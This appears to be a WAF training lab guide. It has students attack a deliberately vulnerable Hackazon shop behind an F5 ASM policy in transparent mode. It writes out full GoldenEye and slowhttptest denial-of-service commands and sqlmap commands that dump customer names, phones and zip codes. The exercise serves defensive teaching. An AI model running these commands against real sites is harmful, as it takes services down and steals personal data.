Attack Web App behind transparent ASM policy
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

-  ASM policy configured in transparent mode using signature based
       detection

1. Attack via GoldenEye

   a. (Kali) Browse to GoldenEye directory and execute attack.

      i.  # cd /root/Agility/GoldenEye

      ii. # ./goldeneye.py http://hackazon-waf.f5agility.com -d -w 50 -s
          200

   a. Observe impact

      i. Is site available?

   b. (Kali) Stop attack

      i. <Ctrl>+C

2. Attack via SLOWHTTPTEST

   a. (Kali) Browse to slowhttptest directory and execute attack

      i.  # cd /root/Agility/slowhttptest

      ii. # slowhttptest -c 1000 -H -g -o slowloris\_stats\_lab3 -i 10
          -r 200 -s 8192 -t GET -u http://hackazon-waf.f5agility.com -x
          24 -p 3

   b. Observe impact

      i.   Is site available?

      ii.  Review LTM virtual Server statistics

      iii. (Hackazon) Review Server Stats

           1. # top

           2. # free –m

   c. (Kali) Stop Attack

   d. (Optional) Try some other variants of slowhttptest

      i.   # slowhttptest -c 1000 -B -g -o slowloris\_stats\_lab3.1 -i
           10 -r 200 -s 8192 -t GET -u http://hackazon-waf.f5agility.com
           -x 24 -p 3

           1. Slow body attack

      ii.  # slowhttptest -c 1000 -R -g -o slowloris\_stats\_lab3.2 -i
           10 -r 200 -s 8192 -t GET -u http://hackazon-waf.f5agility.com
           -x 24 -p 3

           1. Range attack

      iii. # slowhttptest -c 1000 -X -g -o slowloris\_stats\_lab3.3 -i
           10 -r 200 -s 8192 -t GET -u http://hackazon-waf.f5agility.com
           -x 24 -p 3

           1. Slow read

3. Attack via SQLMap

   a. (Kali) Repeat SQL Injection from previous lab

      i.   # cd /root/Agility/sqlmap

      ii.  # sqlmap -u
           http://hackazon-waf.f5agility.com/product/view?id=51 -- dbs

      iii. # sqlmap -u
           http://hackazon-waf.f5agility.com/product/view?id=51 -D
           hackazon --tables

      iv.  # sqlmap -u
           http://hackazon-waf.f5agility.com/product/view?id=51 -D
           hackazon -T tbl\_customer\_address --columns

      v.   # sqlmap -u
           http://hackazon-waf.f5agility.com/product/view?id=51 -D
           hackazon -T tbl\_customer\_address -C full\_name,phone,zip
           --dump

   b. Observe impact

      i. Is site available?

4. (Optional) Attack via Metasploit

-  Repeat steps in previous Metasploit lab.

-  Don’t forget to update the URL for WAF!
